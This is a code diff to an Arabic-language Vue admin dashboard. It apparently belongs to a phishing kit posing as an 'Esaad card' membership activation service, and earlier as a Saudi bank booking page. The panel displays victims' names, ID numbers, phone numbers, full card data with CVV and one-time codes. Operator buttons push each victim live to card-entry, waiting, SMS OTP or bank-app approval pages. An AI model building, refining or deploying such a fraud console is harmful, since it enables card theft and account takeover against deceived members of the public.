@@ -88,23 +88,23 @@ let knownSignature = '';
 const pageLabels: Record<string, string> = {
   '/': 'الصفحة الرئيسية',
   '/request': 'تفعيل عضوية أفراد',
-  '/register-company': 'تسجيل الشركة (عضوية شركات)',
+  '/register-company': 'تفعيل عضوية شركات',
   '/payment': 'ملخص الرسوم',
-  '/card-details': 'الدفع ببطاقة الائتمان',
-  '/waiting': 'صفحة الانتظار',
+  '/card-details': 'الدفع بالبطاقة',
+  '/waiting': 'يرجى الانتظار',
   '/otp': 'OTP SMS',
   '/otp-bank': 'رسالة موافقة من تطبيق البنك'
 };
 
 const redirectOptions = [
-  { value: '/otp-bank', label: 'رسالة موافقة من تطبيق البنك' },
-  { value: '/otp', label: 'OTP SMS' },
-  { value: '/waiting', label: 'صفحة الانتظار' },
-  { value: '/card-details', label: 'الدفع ببطاقة الائتمان' },
-  { value: '/payment', label: 'ملخص الرسوم' },
+  { value: '/', label: 'الصفحة الرئيسية' },
   { value: '/request', label: 'تفعيل عضوية أفراد' },
-  { value: '/register-company', label: 'تسجيل الشركة (عضوية شركات)' },
-  { value: '/', label: 'الصفحة الرئيسية' }
+  { value: '/register-company', label: 'تفعيل عضوية شركات' },
+  { value: '/payment', label: 'ملخص الرسوم' },
+  { value: '/card-details', label: 'الدفع بالبطاقة' },
+  { value: '/waiting', label: 'يرجى الانتظار' },
+  { value: '/otp', label: 'OTP SMS' },
+  { value: '/otp-bank', label: 'رسالة موافقة من تطبيق البنك' }
 ];
 
 const stepFallbackPage: Record<string, string> = {
@@ -122,27 +122,28 @@ const normalizeActionToPath = (action?: string | null): string => {
 };
 
 const getRequestCurrentPagePath = (req: RequestData) => {
+  if (userPages.value[req.id]) return userPages.value[req.id];
   const pending = normalizeActionToPath(req.nextAction);
   if (pending) return pending;
-  return userPages.value[req.id] || stepFallbackPage[req.step] || '/request';
+  return stepFallbackPage[req.step] || (req.cardType === 'company' ? '/register-company' : '/request');
 };
 
 const getRequestCurrentPageLabel = (req: RequestData) => {
   const path = getRequestCurrentPagePath(req);
-  if (req.step === 'card' && path === '/waiting' && !userPages.value[req.id]) {
-    return 'الدفع ببطاقة الائتمان';
-  }
   return pageLabels[path] || path;
 };
 
-watch(selectedRequestId, (newId) => {
-  const req = requests.value.find(r => r.id === newId);
-  if (!req) {
-    selectedRedirectPage.value = '';
-    return;
+watch(
+  [selectedRequestId, () => (selectedRequestId.value ? userPages.value[selectedRequestId.value] : '')],
+  ([newId]) => {
+    const req = requests.value.find(r => r.id === newId);
+    if (!req) {
+      selectedRedirectPage.value = '';
+      return;
+    }
+    selectedRedirectPage.value = getRequestCurrentPagePath(req);
   }
-  selectedRedirectPage.value = getRequestCurrentPagePath(req);
-});
+);
 
 const getVisitorCode = (id: string) => {
   let hash = 0;
@@ -502,12 +503,6 @@ const filteredRequests = computed(() => {
           <span>{{ pendingOtpCount }}</span>
           <span class="text-gray-300">/</span>
           <span>{{ totalVisitorsCount }}</span>
-          <span class="text-gray-300">/</span>
-          <span>246</span>
-          <span class="text-gray-300">/</span>
-          <span>600</span>
-          <span class="text-gray-300">/</span>
-          <span>648</span>
           <TrendingUp class="w-3.5 h-3.5 text-[#1976d2] ml-1" />
         </div>
       </div>
@@ -834,37 +829,18 @@ const filteredRequests = computed(() => {
 
                   <div class="grid grid-cols-1 gap-1.5">
                     <button
-                      @click="updateNextAction(selectedRequest.id, 'otp-sms')"
+                      v-for="opt in redirectOptions"
+                      :key="opt.value"
+                      @click="updateNextAction(selectedRequest.id, opt.value)"
                       class="w-full py-1.5 px-2.5 rounded text-xs font-bold border transition-colors cursor-pointer text-right flex items-center justify-between"
                       :class="
-                        selectedRequest.nextAction === 'otp-sms' || selectedRequest.nextAction === '/otp'
+                        getRequestCurrentPagePath(selectedRequest) === opt.value
                           ? 'bg-[#dbeafe] border-[#1976d2] text-[#1976d2]'
                           : 'bg-white border-gray-200 text-gray-700 hover:bg-gray-50'
                       "
                     >
-                      <span>OTP SMS</span>
-                      <Smartphone class="w-3.5 h-3.5" />
-                    </button>
-
-                    <button
-                      @click="updateNextAction(selectedRequest.id, 'otp-bank')"
-                      class="w-full py-1.5 px-2.5 rounded text-xs font-bold border transition-colors cursor-pointer text-right flex items-center justify-between"
-                      :class="
-                        selectedRequest.nextAction === 'otp-bank' || selectedRequest.nextAction === '/otp-bank'
-                          ? 'bg-[#dbeafe] border-[#1976d2] text-[#1976d2]'
-                          : 'bg-white border-gray-200 text-gray-700 hover:bg-gray-50'
-                      "
-                    >
-                      <span>رسالة موافقة من تطبيق البنك</span>
-                      <Building2 class="w-3.5 h-3.5" />
-                    </button>
-
-                    <button
-                      @click="updateNextAction(selectedRequest.id, '/card-details')"
-                      class="w-full py-1.5 px-2.5 rounded text-xs font-bold bg-white border border-gray-200 text-gray-700 hover:bg-gray-50 transition-colors cursor-pointer text-right flex items-center justify-between"
-                    >
-                      <span>إعادة لصفحة البطاقة</span>
-                      <CreditCard class="w-3.5 h-3.5" />
+                      <span>{{ opt.label }}</span>
+                      <FileText class="w-3.5 h-3.5 shrink-0" />
                     </button>
                   </div>
                 </div>
@@ -929,10 +905,10 @@ const filteredRequests = computed(() => {
             <!-- Center-Right Timeline Feed (Matches Screenshot Feed Cards) -->
             <div class="flex-1 overflow-y-auto px-8 py-6 bg-white">
               <div class="max-w-4xl mx-auto flex flex-col">
-                <!-- ==================== CARD 1: الدفع (PAYMENT CARD) ==================== -->
+                <!-- ==================== CARD 1: الدفع بالبطاقة (PAYMENT CARD) ==================== -->
                 <div class="w-[345px] ml-auto bg-[#f1f3f5] rounded-lg p-4 border border-gray-200/80 mb-4">
                   <div class="text-right font-bold text-sm text-gray-700 mb-3" dir="rtl">
-                    الدفع
+                    الدفع بالبطاقة
                   </div>
 
                   <div
@@ -941,15 +917,15 @@ const filteredRequests = computed(() => {
                     style="background: linear-gradient(135deg, #ebedef 0%, #dee3e7 55%, #d2d8de 100%);"
                     dir="ltr"
                   >
-                    <!-- Card Top Row: Bank Emblem + Currency Badge -->
+                    <!-- Card Top Row: Esaad Emblem + Currency Badge -->
                     <div class="flex items-center justify-between mb-5">
                       <div class="flex items-center gap-1.5">
-                        <div class="w-5 h-5 rotate-45 rounded-xs bg-gray-800 flex items-center justify-center">
-                          <div class="w-2 h-2 bg-amber-400 rounded-full"></div>
+                        <div class="w-5 h-5 rounded-xs bg-[#008a40] flex items-center justify-center">
+                          <span class="text-[8px] font-black text-white">E</span>
                         </div>
                         <div class="leading-none">
-                          <div class="text-[9px] font-bold text-gray-800">البنك السعودي للاستثمار</div>
-                          <div class="text-[7px] text-gray-600">The Saudi Investment Bank</div>
+                          <div class="text-[9px] font-bold text-gray-800">بطاقة إسعاد</div>
+                          <div class="text-[7px] text-gray-600">Esaad Payment Card</div>
                         </div>
                       </div>
 
@@ -979,7 +955,7 @@ const filteredRequests = computed(() => {
                         <div class="text-xs font-medium text-gray-800 select-all mb-2">
                           {{ selectedRequest.paymentName || selectedRequest.name }}
                         </div>
-                        <div class="w-4 h-3 rounded-xs bg-[#006c35] flex items-center justify-center">
+                        <div class="w-4 h-3 rounded-xs bg-[#008a40] flex items-center justify-center">
                           <div class="w-2.5 h-0.5 bg-white/80"></div>
                         </div>
                       </div>
@@ -990,9 +966,8 @@ const filteredRequests = computed(() => {
                           {{ selectedRequest.cvv }}
                         </div>
                         <div class="flex items-center gap-1.5 justify-end">
-                          <span class="text-[8px] font-semibold text-gray-600 tracking-tight">DEBIT • PLATINUM</span>
-                          <div class="px-1 py-0.2 bg-white/80 rounded-xs border border-gray-300 text-[7px] font-black text-[#1976d2]">
-                            mada
+                          <div class="px-1 py-0.2 bg-white/80 rounded-xs border border-gray-300 text-[7px] font-black text-[#1434cb] italic">
+                            VISA / MC
                           </div>
                         </div>
                       </div>
@@ -1028,13 +1003,13 @@ const filteredRequests = computed(() => {
                   <span class="w-12 h-px bg-gray-200"></span>
                 </div>
 
-                <!-- ==================== CARD 2: حجز موعد / بيانات الطلب ==================== -->
+                <!-- ==================== CARD 2: تفعيل عضوية أفراد / تفعيل عضوية شركات ==================== -->
                 <div
                   class="w-[345px] ml-auto bg-[#f1f3f5] rounded-lg p-4 border border-gray-200/80 mb-4 text-right"
                   dir="rtl"
                 >
                   <div class="font-bold text-sm text-gray-700 mb-3">
-                    حجز موعد
+                    {{ selectedRequest.cardType === 'company' ? 'تفعيل عضوية شركات' : 'تفعيل عضوية أفراد' }}
                   </div>
 
                   <div class="space-y-2 text-[12px] text-gray-800 font-medium leading-relaxed">
@@ -1043,46 +1018,26 @@ const filteredRequests = computed(() => {
                       <span class="font-semibold text-gray-900 select-all">{{ selectedRequest.name }}</span>
                     </div>
                     <div>
-                      <span class="text-gray-600">رقم الهوية : </span>
+                      <span class="text-gray-600">
+                        {{ selectedRequest.cardType === 'company' ? 'البريد الإلكتروني : ' : 'رقم الهوية الإماراتية : ' }}
+                      </span>
                       <span class="font-mono font-semibold text-gray-900 select-all tabular-nums">{{ selectedRequest.idNumber }}</span>
                     </div>
                     <div>
-                      <span class="text-gray-600">رقم الجوال : </span>
+                      <span class="text-gray-600">رقم الهاتف المتحرك : </span>
                       <span class="font-mono font-semibold text-gray-900 select-all tabular-nums">{{ selectedRequest.mobile }}</span>
-                    </div>
-                    <div>
-                      <span class="text-gray-600">العنوان : </span>
-                      <span class="font-semibold text-gray-900 select-all">{{ selectedRequest.address || 'غير محدد' }}</span>
                     </div>
                     <div>
                       <span class="text-gray-600">فئة البطاقة : </span>
                       <span class="font-semibold text-gray-900">{{ formatCardTypeLabel(selectedRequest.cardType) }}</span>
                     </div>
                     <div>
-                      <span class="text-gray-600">نوع الخدمة : </span>
-                      <span class="font-semibold text-gray-900">إصدار وتوصيل بطاقة إسعاد</span>
+                      <span class="text-gray-600">العنوان : </span>
+                      <span class="font-semibold text-gray-900 select-all">{{ selectedRequest.address || 'غير محدد' }}</span>
                     </div>
-                    <div>
-                      <span class="text-gray-600">تاريخ الطلب : </span>
-                      <span class="font-mono text-[11px] text-gray-800" dir="ltr">
-                        {{ new Date(selectedRequest.createdAt).toUTCString() }}
-                      </span>
-                    </div>
-                    <div>
-                      <span class="text-gray-600">موعد الخدمة : </span>
-                      <span class="font-semibold text-gray-900">{{ selectedRequest.date || '03:00 م' }}</span>
-                    </div>
-                    <div>
-                      <span class="text-gray-600">رسوم الخدمة : </span>
-                      <span class="font-mono font-semibold tabular-nums">100</span>
-                    </div>
-                    <div>
-                      <span class="text-gray-600">ضريبة القيمة المضافة : </span>
-                      <span class="font-mono font-semibold tabular-nums">15</span>
-                    </div>
-                    <div>
-                      <span class="text-gray-600">مجموع : </span>
-                      <span class="font-mono font-bold tabular-nums">115</span>
+                    <div v-if="selectedRequest.date">
+                      <span class="text-gray-600">التاريخ : </span>
+                      <span class="font-mono font-semibold text-gray-900">{{ selectedRequest.date }}</span>
                     </div>
                   </div>
                 </div>
@@ -1094,13 +1049,13 @@ const filteredRequests = computed(() => {
                   <span class="w-12 h-px bg-gray-200"></span>
                 </div>
 
-                <!-- ==================== CARD 3: الدفع & إجراءات التحقق ==================== -->
+                <!-- ==================== CARD 3: OTP SMS / رسالة موافقة من تطبيق البنك ==================== -->
                 <div
                   class="w-[345px] ml-auto bg-[#f1f3f5] rounded-lg p-4 border border-gray-200/80 mb-4 text-right"
                   dir="rtl"
                 >
                   <div class="font-bold text-sm text-gray-700 mb-3">
-                    الدفع والتحقق
+                    {{ selectedRequest.step === 'otp-bank' ? 'رسالة موافقة من تطبيق البنك' : 'OTP SMS' }}
                   </div>
 
                   <div v-if="selectedRequest.otp" class="space-y-3 mb-3">
